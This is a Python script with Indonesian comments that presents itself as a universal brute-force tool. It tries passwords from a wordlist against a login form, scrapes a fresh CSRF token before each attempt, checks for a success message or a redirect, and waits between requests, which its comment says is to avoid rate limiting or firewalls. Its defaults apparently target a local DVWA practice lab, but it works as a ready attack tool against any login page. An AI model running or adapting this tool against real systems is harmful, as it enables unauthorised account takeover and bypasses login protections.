#!/usr/bin/env python3
import os
import time
import requests
from bs4 import BeautifulSoup

# Matikan warning SSL untuk target HTTPS lokal/self-signed
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    print("===============================================")
    print("    UNIVERSAL BRUTE-FORCE TOOL (PYTHON)        ")
    print("===============================================")

    # --- BAGIAN INPUT INTERAKTIF ---
    target = input("[?] Input Target URL (default http://127.0.0.1:8000): ").strip()
    if not target:
        target = "http://127.0.0.1:8000"

    path_target = input("[?] Input path halaman target/brute (default /vulnerabilities/brute/): ").strip()
    if not path_target:
        path_target = "/vulnerabilities/brute/"

    # Gabungkan base URL dan path
    url = target.rstrip('/') + '/' + path_target.lstrip('/')

    method_choice = input("[?] Pilih Metode Request [1] GET (Default) [2] POST: ").strip()
    method = 'POST' if method_choice == '2' else 'GET'

    user_param = input("[?] Input nama parameter username (default username): ").strip()
    if not user_param:
        user_param = 'username'

    pass_param = input("[?] Input nama parameter password (default password): ").strip()
    if not pass_param:
        pass_param = 'password'

    token_param = input("[?] Input nama parameter token CSRF (kosongkan jika tidak ada, default user_token): ").strip()
    if not token_param:
        token_param = 'user_token'

    submit_param = input("[?] Input nama tombol submit/Login (opsional, tekan Enter jika tidak ada): ").strip()

    user = input("[?] Input target username: ").strip()
    pass_file = input("[?] Input file name passlist: ").strip()

    success_text = input("[?] Input teks penanda sukses / Flag (default 'Welcome to the password protected area'): ").strip()
    if not success_text:
        success_text = "Welcome to the password protected area"

    delay_input = input("[?] Input delay antar request dalam detik (default 1): ").strip()
    delay = float(delay_input) if delay_input else 1.0

    if not os.path.exists(pass_file):
        print(f"[-] Error: File passlist '{pass_file}' tidak ditemukan!")
        return

    print("-----------------------------------------------")
    print(f"[+] Target Aktif: {url}")
    print("-----------------------------------------------")

    # Gunakan Session agar Cookie otomatis tersimpan antar request
    session = requests.Session()

    # Baca file passlist
    try:
        with open(pass_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = f.read().splitlines()
    except Exception as e:
        print(f"[-] Gagal membaca passlist: {e}")
        return

    # Mulai proses perulangan brute-force
    for password in passwords:
        token_brute = ""

        try:
            # 1. Ambil halaman target untuk mendapatkan token CSRF terbaru & cookie sesi
            resp_get = session.get(url, verify=False, timeout=10)

            # 2. Ekstrak token CSRF menggunakan BeautifulSoup (jika parameter token diisi)
            if token_param:
                soup = BeautifulSoup(resp_get.text, 'html.parser')
                token_input = soup.find('input', {'name': token_param})
                if token_input and token_input.has_attr('value'):
                    token_brute = token_input['value']

            # 3. Susun data payload
            payload = {
                user_param: user,
                pass_param: password
            }
            if token_param and token_brute:
                payload[token_param] = token_brute
            if submit_param:
                payload[submit_param] = "Login"

            # 4. Kirim request POST atau GET
            if method == 'POST':
                resp = session.post(url, data=payload, verify=False, allow_redirects=True, timeout=10)
            else:
                resp = session.get(url, params=payload, verify=False, allow_redirects=True, timeout=10)

            print(f"\033[31m[-] Trying: {password} (Status: {resp.status_code})\033[0m")

            # 5. Periksa indikator sukses (berdasarkan teks flag atau kode redirect 302)
            if success_text in resp.text or resp.status_code == 302:
                print("\n" + "=" * 50)
                print(f"\033[32m[+] BINGO! Password ditemukan -> {user} : {password}\033[0m")
                print("=" * 50)
                break

        except requests.exceptions.RequestException as e:
            print(f"[-] Gangguan koneksi: {e}")
        except Exception as e:
            print(f"[-] Terjadi kesalahan: {e}")

        # Jeda waktu (delay) agar aman dari rate limiting / firewall server
        time.sleep(delay)

if __name__ == '__main__':
    main()
